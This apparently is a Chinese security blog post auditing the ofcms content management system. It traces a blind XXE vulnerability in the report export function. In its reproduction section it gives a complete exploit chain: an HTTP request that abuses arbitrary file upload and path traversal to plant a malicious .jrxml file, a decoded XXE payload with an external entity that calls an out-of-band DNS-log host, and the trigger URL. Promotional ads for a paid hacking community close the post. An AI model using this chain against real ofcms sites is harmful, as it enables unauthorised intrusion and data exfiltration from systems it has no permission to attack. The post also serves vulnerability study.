#  ofcms的XXE漏洞分析   
 渗透安全团队   2025-05-29 02:43  
  
forever young  
  
  
  
路虽远行则将至，  
事虽难做则必成。  
  
  
01  
  
代码审计  
  
赤弋安全  
  
XXE 代码审计常搜索的关键字如下：  
```
XMLReader
SAXBuilder
SAXReader
SAXParserFactory
Digester
DocumentBuilderFactory
...
```  
  
还有一个特殊的，用于加载.jrxml  
文件，还是JasperReports  
特定的 XML 格式，用于定义报告模板。  
```
JRXmlLoader
```  
  
该项目大量存在XMLReader  
，SAXBuilder  
，Digester  
等这些函数，大多都是内部调用，唯一一处调用，文件位置位于：com/ofsoft/cms/admin/controller/ReprotAction.java  
其中的expReport  
方法。  
  
接下来我们一步一步进行分析。	  
  
第 35 行，获取响应包，通过getParamsMap  
返回的result Map 类型赋值给 Map 类型的数据集 hm，通过 j(string 类型)赋值给 jrxmlFileName  
。  
  
第 39 行，创建一个新的文件，路径是根路径和上面的路径进行拼接，接着从请求中获取reportName  
赋值给 filename  
，返回信息报表文件名的路径。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tb6OwBlojE8AlEU6ow3BtCenuszib138Xk1LL1IE5L7yKsZHWDtlkbOO1tIibqZc2I5oCibVSzYVialwtialIZwEWXQ/640?wx_fmt=png&from=appmsg "")  
  
这里getParamsMap()  
有传参，后面将输入的值传递给 hm  
 和 jrxmlFileName  
 服务器接收用户输入的参数 j 后，拼接生成文件路径，这里没有进行过滤，可以穿越到其他目录，但是限制了文件的后缀为 jrxml。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tb6OwBlojE8AlEU6ow3BtCenuszib138Xl2EmQFyKlWNlhiacZv9lJficNsdyA7zzgWbSt6tiadYibqNDFqrYaIbUXA/640?wx_fmt=png&from=appmsg "")  
  
接下来会调用JasperCompileManager.compileReport()  
方法，跟进方法进行查看。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tb6OwBlojE8cA6Jlk7uqppUNBEnwgMLR0pU2KzUAX7Mgj9QQSKgmGgibGcX5a4iawLlobpDeLv9Wjsx8Wia8rOvDw/640?wx_fmt=png&from=appmsg "")  
  
继续跟进，来到D:\apache-maven-3.6.1\mvn_resp\net\sf\jasperreports\jasperreports\5.6.1\jasperreports-5.6.1.jar!\net\sf\jasperreports\engine\JasperCompileManager.class  
第 79 行，这里使用了JRXmlLoader.load()  
，  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tb6OwBlojE8AlEU6ow3BtCenuszib138Xabn9z51ZxKPXn1csXsLNiaYr7CUhPZCWelTgrlD54jTBUpibeqCyztfQ/640?wx_fmt=png&from=appmsg "")  
  
继续跟进  
了 JRXmlLoader.load 方法处理 XML 文件，最后查看到本质还是调用了digester.parse  
，进行了处理。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tb6OwBlojE8AlEU6ow3BtCenuszib138XbaqZPnDDvUicCvickWd2abR9ecxxh6Ojbp5bakSMsgoXOtqkYnvSF8ng/640?wx_fmt=png&from=appmsg "")  
  
从接口还有路径可知，这就是一个通用的导出功能。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tb6OwBlojE8AlEU6ow3BtCenuszib138XbdBLO1YaIRG6m3S89f7ibvKVjTsO08ECyEu0Ixsib4iae4xDyIAUnOJdg/640?wx_fmt=png&from=appmsg "")  
  
ReprotAction  
类的expReport()  
方法将其调用，并且ReprotAction  
类上存在一个@Action(path = "/reprot")  
注解，也就是说这里可以被前端请求触发执行，触发该expReport()  
方法的接口为：/admin/reprot/expReport.json  
。  
  
接下来做两件事：  
  
1、确定传参，有无过滤。  
  
2、触发接口，进行漏洞测试。  
  
从下面这段代码可以看出：compileReport(new FileInputStream(file))  
的 file 是从"/WEB-INF/jrxml/" + jrxmlFileName + ".jrxml"  
获取的.jrxml  
文件，而具体什么文件，由前端传递的"j"  
参数决定。  
  
简单来说就是：在/WEB-INF/jrxml/  
目录下寻找"j"  
参数指定的.jrxml  
文件，进行jrxml  
文件的解析。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tb6OwBlojE8AlEU6ow3BtCenuszib138X3m4X9YOtRzbjtbtl6ic97BrG94V90hLvnam0Ne2KpuMN1kaC649haHQ/640?wx_fmt=png&from=appmsg "")  
  
在整个调用链中对文件并没有进行过滤，包括也没有禁止解析外部实体(默认是可以解析外部实体的)，所以这里存在 XXE 漏洞。  
  
那这样的话，我们只需要保证：前端触发/admin/reprot/expReport.json  
接口时，传递"j"  
参数指定的.jrxml  
文件中存在恶意外部实体，就可以实现漏洞利用。  
  
这里还有一个问题："j"  
参数指定的.jrxml  
文件是在/WEB-INF/jrxml/  
目录下，这里我们是不可控的，因此怎么让它能够加载一个存在恶意外部实体的.jrxml  
文件呢？  
  
这里只能结合该cms的文件上传漏洞，写入恶意.jrxml  
，来实现XXE漏洞的利用（如果这里不存在文件上传漏洞，这里无法利用）。  
  
接下来，尝试利用一下：（这里没有回显，使用盲XXE方式）  
  
02  
  
漏洞复现  
  
赤弋安全  
  
任意文件上传一个带恶意外部实体的.jrxml  
文件。  
```
POST /admin/cms/template/save.json HTTP/1.1
Host: 192.168.1.8
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.1.8
Cookie: JSESSIONID=572DD825340524B985A7A640DC18E95F
Accept: application/json, text/javascript, */*; q=0.01
Referer: http://192.168.1.8/admin/cms/template/getTemplates.html
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 5142
file_path=D%3A%5Capache-tomcat-8.5.68%5Cwebapps%5CROOT%5CWEB-INF%5Cpage%5Cdefault%5Cindex.html&dirs=%2F&res_path=&file_name=..%2F..%2F..%2Fstatic%2Fexp.jrxml&file_content=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE%20root%20%5B%3C!ENTITY%20%25%20exp%20SYSTEM%20%22http%3A%2F%2Fxyblfvjxop.yutu.eu.org%22%3E%25exp%3B%5D%3E%0A%20%0A
```  
  
file_content 解码如下：  
```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % exp SYSTEM "http://dnslog">%exp;]>
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tb6OwBlojE8AlEU6ow3BtCenuszib138XdlK79OyQFRdGzXSMq3PlatMI3rDqbdDx6WMZINtQtcTMvhJeysK8uw/640?wx_fmt=png&from=appmsg "")  
  
触发/admin/reprot/expReport.json  
接口，根据功能和接口可以定位到：用户管理-导出全部。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tb6OwBlojE8AlEU6ow3BtCenuszib138XxrU7X8Kw1w0EhOP6Bfw847M2G0tNbvOEO6mmhSvCNApiaRbM7mVTPGQ/640?wx_fmt=png&from=appmsg "")  
  
```
Url：http://192.168.1.8/admin/reprot/expReport.html?j=../../static/exp&reportName=20160813
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Tb6OwBlojE8AlEU6ow3BtCenuszib138XWibia8EiaBYvA2tdvEx1sItockIfbTlYicdQYmmicuCVSpC9dXVV6R4ctMQ/640?wx_fmt=png&from=appmsg "")  
  
成功请求 dnslog 地址。  
  
****  
  
**★**  
  
**付费圈子**  
  
  
**欢 迎 加 入 星 球 ！**  
  
**代码审计+免杀+渗透学习资源+各种资料文档+各种工具+付费会员**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.4447566002908574&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**进成员内部群**  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/pPVXCo8Wd8AQHAyOTgM5sLrvP6qiboXljGWG0uOdvcNR8Qw5QJLxSVrbFds2j7MxExOz1ozb9ZoYwR68leoLdAg/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.09738205945672873&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**星球的最近主题和星球内部工具一些展示******  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/pPVXCo8Wd8Doq0iczyRiaBfhTQyfzqSGuia4lfHfazabEKr2EDe7sGVoxUhLrNRA4FbI1yef6IkWdmzxvZrTiaJncg/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8BmE6FAA8Bq7H9GZIRt1xYZpmYNWxrrzolt71FtX5HyM03H0cxkiaYelv7ZSajLtibEdBXUpCibdItXw/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8ADSxxicsBmvhX9yBIPibyJTWnDpqropKaIKtZQE3B9ZpgttJuibibCht1jXkNY7tUhLxJRdU6gibnrn0w/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8DKZcqe8mOKY1OQN5yfOaD5MpGk0JkyWcDKZvqqTWL0YKO6fmC56kSpcKicxEjK0cCu8fG3mLFLeEg/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8DAc8LkYEjnluf7oQaBR9CR7oAqnjIIbLZqCxwQtBk833sLbiagicscEic0LSVfOnbianSv11PxzJdcicQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8B96heXWOIseicx7lYZcN8KRN8xTiaOibRiaHVP4weL4mxd0gyaWSuTIVJhBRdBmWXjibmcfes6qR1w49w/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8DAc8LkYEjnluf7oQaBR9CRBgpPoexbIY7eBAnR7sWS1BlBAQX51QhcOOOz06Ct2x1cMD25nA6mJQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8AqNwoQuOBy9yePOpO5Kr6aHIxj7d0ibfAuPx9fAempAoH9JfIgX4nKzCwDyhQzPrRIx4upyw5yT4Q/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
****  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif&random=0.4447566002908574&tp=wxpic&wxfrom=5&wx_lazy=1 "")  
  
  
**加入安全交流群**  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzkxNDAyNTY2NA==&mid=2247513602&idx=1&sn=98045772ff9aebe8792552e32523bf83&chksm=c1764badf601c2bbcc199da519611ac8c36c17e5a0554fe32ab9d9769403a495187058f19f3d&scene=21#wechat_redirect)  
  
 			                  
  
  
**信 安 考 证**  
  
  
  
需要考以下各类安全证书的可以联系我，下方扫码回复  
**考证**  
进交流群，价格优惠、组团更便宜，还送【  
渗透安全团队  
】知识星球**1**  
年！  
<table><tbody><tr style="outline: 0px;"><td data-colwidth="557" width="557" valign="top" style="outline: 0px;word-break: break-all;hyphens: auto;"><p style="outline: 0px;"><span style="outline: 0px;font-size: 14px;letter-spacing: 0.51px;"><span leaf="">CISP、PTE、PTS、DSG、IRE、IRS、</span></span><span style="outline: 0px;font-size: 14px;letter-spacing: 0.51px;"><span leaf="">NISP、</span></span><span style="outline: 0px;font-size: 14px;letter-spacing: 0.51px;"><span leaf="">PMP、CCSK、CISSP、ISO27001...</span></span></p></td></tr></tbody></table>  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8AOzYX7kxefGbGGZg3g1ltkN30q9hceg23PiczgUqMT0EE9w0fLK9uw1eKWwQX9TljXQe1OQeHRZ2Q/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**教程如下图**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/pPVXCo8Wd8C3Gu1libJC0muV1WmOFa3XM3fTyOiaOJYPgCiaHV6gkJJBia6Fjeds9w9pxxyyPNJhbcfK3I1tcGueTg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
  
**推荐阅读**  
  
  
  
**干货｜史上最全一句话木马**  
  
  
**干货 | CS绕过vultr特征检测修改算法**  
  
  
**实战 | 用中国人写的红队服务器搞一次内网穿透练习**  
  
  
**实战 | 渗透某培训平台经历**  
  
  
**实战 | 一次曲折的钓鱼溯源反制**  
  
  
**免责声明**  
  
由于传播、利用本公众号渗透安全团队所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号渗透安全团队及作者不为**此**  
承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
好文分享收藏赞一下最美点在看哦  
  
  
